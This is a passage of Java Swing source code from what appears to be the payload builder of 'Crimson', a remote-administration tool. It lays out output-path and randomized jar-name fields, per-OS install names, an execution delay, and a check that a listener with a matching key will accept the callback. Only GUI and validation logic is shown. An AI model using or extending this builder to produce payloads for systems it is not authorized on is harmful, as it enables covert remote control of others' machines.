		lblOutputPath.setBounds(12, 20, 56, 15);
		output_panel.add(lblOutputPath);

		textField_output_path = new JTextField();
		textField_output_path.setBounds(86, 20, 469, 19);
		output_panel.add(textField_output_path);
		textField_output_path.setToolTipText("Identifies output directory. Does not contain the file name.");
		textField_output_path.setColumns(10);

		JLabel lblJarName = new JLabel("Name:");
		lblJarName.setHorizontalAlignment(SwingConstants.TRAILING);
		lblJarName.setBounds(12, 47, 56, 15);
		output_panel.add(lblJarName);

		textField_output_name = new JTextField();
		textField_output_name.setBounds(86, 47, 114, 19);
		output_panel.add(textField_output_name);
		textField_output_name.setToolTipText("Name of the payload being generated.  If no extension is specified, the default will be used.");
		textField_output_name.setColumns(10);

		JButton btnRandomizeName = new JButton(T.t("misc-randomize"));
		btnRandomizeName.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				textField_output_name.setText(subterranean.crimson.universal.Utilities.nameGen(5) + ".jar");

			}
		});
		btnRandomizeName.setFont(new Font("Dialog", Font.BOLD, 9));
		btnRandomizeName.setBounds(212, 47, 88, 19);
		output_panel.add(btnRandomizeName);

		chckbxIWillBe = new JCheckBox("I will use this Jar to install Crimson only on systems that I have authorization to do so.");
		chckbxIWillBe.setFont(new Font("Dialog", Font.BOLD, 9));
		chckbxIWillBe.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				if (chckbxIWillBe.isSelected()) {
					btnGenerate.setEnabled(false);

				} else {
					btnGenerate.setEnabled(true);
				}

			}
		});
		chckbxIWillBe.setBounds(8, 277, 465, 23);
		generate_panel.add(chckbxIWillBe);

		compatibility = new JLabel("");
		compatibility.setHorizontalAlignment(SwingConstants.CENTER);
		compatibility.setBounds(12, 242, 567, 15);
		generate_panel.add(compatibility);

		if (!Version.release) {
			textField_server_address.setText("127.0.0.1");
			textField_server_port.setText("2031");

			if (Platform.windows) {
				textField_output_path.setText("C:/Users/win/Desktop/");
			} else if (Platform.osx) {
				textField_output_path.setText("/Users/Jillian/Desktop/");
			} else {
				textField_output_path.setText("/home/globalburning/Desktop/");
			}

			textField_output_name.setText("payload.jar");
		}

		btnBrowse.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				int returnVal = fc.showOpenDialog(Main.this);

				if (returnVal == JFileChooser.APPROVE_OPTION) {
					File file = fc.getSelectedFile();
					if (file.isDirectory()) {
						dispose();
					}
					// add the file
					String filename = file.getName();
					if (!filename.endsWith(".jar")) {
						filename += ".jar";
						Logger.add("Output filename is: " + filename);
					}
					// TODO finish implementation of file chooser
					textField_output_name.setText(filename);
					String path = file.getAbsolutePath();
					path = path.substring(0, path.lastIndexOf(File.separator) + 1);

					textField_output_path.setText(path);

				}

			}
		});

		updateCompatibility();

	}

	protected void dispose() {

	}

	public boolean validateFields(Options opts, Path outPATH) {
		try {
			// check essential options
			if (outPATH.getAbsolutePath().isEmpty()) {
				parent.addNotification("Cannot have empty output path");

				return false;
			}

			// check client install names
			Path win = opts.windows;
			Path linux = opts.linux;
			Path osx = opts.osx;

			if (!win.getAbsolutePath().isEmpty()) {

				if (win.getName().split("\\.").length == 1) {
					// no file extension
					parent.addNotification("Windows install name must have an extension");

					return false;
				}

			}

			if (!linux.getAbsolutePath().isEmpty()) {

				if (linux.getName().split("\\.").length == 1) {
					// no file extension
					parent.addNotification("Linux install name must have an extension");
					return false;
				}

			}

			if (!osx.getAbsolutePath().isEmpty()) {

				if (osx.getName().split("\\.").length == 1) {
					// no file extension
					parent.addNotification("OSX install name must have an extension");
					return false;
				}

			}

			if (osx.getAbsolutePath().isEmpty() && linux.getAbsolutePath().isEmpty() && win.getAbsolutePath().isEmpty() && !opts.handleErrors) {
				parent.addNotification("You must specify at least one install name");

				return false;
			}

			// check port

			if (!opts.primaryPort.isValid()) {
				Logger.add("Did not pass field validation due to invalid primary port number");
				parent.addNotification("Invalid primary port: " + opts.primaryPort.getAttempt());

				return false;
			}

			// check server address
			if (opts.primaryAddress == null) {
				parent.addNotification("Invalid primary Server address");
				return false;

			}

			// check execution delay
			try {
				if (Integer.parseInt(delay_field.getText()) < 0) {
					throw new NumberFormatException();
				}

			} catch (NumberFormatException e) {
				Logger.add("Did not pass field validation due to invalid delay");
				parent.addNotification("Invalid Delay");
				return false;
			}

			return true;
		} catch (Throwable e) {

			Logger.add("Unknown Error during field verification. An error report will be sent");
			parent.addNotification("An unknown error occured. An error report will be sent.");
			Reporter.report(e);

			return false;
		}
	}

	public void save(Options opts) {

		Server.getSettings().setSavedJarPayloadOptions(opts);
	}

	private void setPayloadDate(Date dateTime) {
		String dateTimeString = "";
		if (dateTime != null)
			dateTimeString = dateTimeFormat.format(dateTime);
		payload_jar_time_textField.setText(dateTimeString);
		payload_calender.setTargetDate(dateTime);
	}

	private void setInstalledDate(Date dateTime) {
		String dateTimeString = "";
		if (dateTime != null)
			dateTimeString = dateTimeFormat.format(dateTime);
		installed_jar_time_textField.setText(dateTimeString);
		installed_calender.setTargetDate(dateTime);
	}

	private static final long serialVersionUID = 1L;

	private JComboBox comboBox_3;

	private JLabel compatibility;

	private JCheckBox chckbxSslConnection;

	public void updateCompatibility() {
		int suitors = 0;// odyssey joke anyone?

		for (ClientListener l : Server.listeners) {
			try {
				boolean ssl = chckbxSslConnection.isSelected();
				int port = Integer.parseInt(textField_server_port.getText());
				if (l.getPORT() != port) {
					continue;
				}

				if (l.usingSSL() != ssl) {
					continue;
				}

				SecretKeySpec key = Cryptography.makeKey(new String(passwordField.getPassword()), (EncType) comboBox_1.getSelectedItem());

				if (!l.getSecretKeySpec().getAlgorithm().equals(key.getAlgorithm())) {
					continue;
				}

				if (!Arrays.equals(l.getSecretKeySpec().getEncoded(), key.getEncoded())) {
					continue;
				}
			} catch (Exception e) {
				continue;

			}
			suitors++;
		}

		if (suitors == 0) {
			compatibility.setForeground(Color.RED);
			compatibility.setText("There is no listener currently running that will accept this connection.");
		} else if (suitors == 1) {
			compatibility.setForeground(Color.GREEN);
			compatibility.setText("A running listener will successfully accept this connection!");
		} else {
			compatibility.setForeground(Color.YELLOW);
			compatibility.setText("More than one listener may be suitable for this connection");

		}

	}
}
